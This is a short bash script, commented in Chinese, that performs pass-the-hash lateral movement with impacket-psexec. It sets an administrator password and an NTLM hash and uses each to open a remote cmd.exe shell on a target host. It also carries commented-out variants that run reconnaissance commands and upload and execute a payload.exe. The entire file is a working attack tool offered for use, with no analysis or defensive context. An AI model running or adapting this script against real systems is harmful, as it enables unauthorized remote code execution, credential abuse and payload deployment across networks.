#!/bin/bash
# PsExec PTH 横向移动脚本

TARGET="192.168.1.100"
DOMAIN="corp"
USER="administrator"
PASS="Password123!"
HASH="aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c"

echo "[*] 使用密码执行命令"
impacket-psexec ${DOMAIN}/${USER}:${PASS}@${TARGET} cmd.exe

echo "[*] 使用哈希 PTH 执行命令（Pass-the-Hash）"
impacket-psexec -hashes ${HASH} ${DOMAIN}/${USER}@${TARGET} cmd.exe

echo "[*] 执行单条命令"
# impacket-psexec -hashes ${HASH} ${DOMAIN}/${USER}@${TARGET} \
#     "whoami && ipconfig /all && net user"

echo "[*] 上传并执行文件"
# impacket-psexec -hashes ${HASH} ${DOMAIN}/${USER}@${TARGET} \
#     -c /path/to/payload.exe
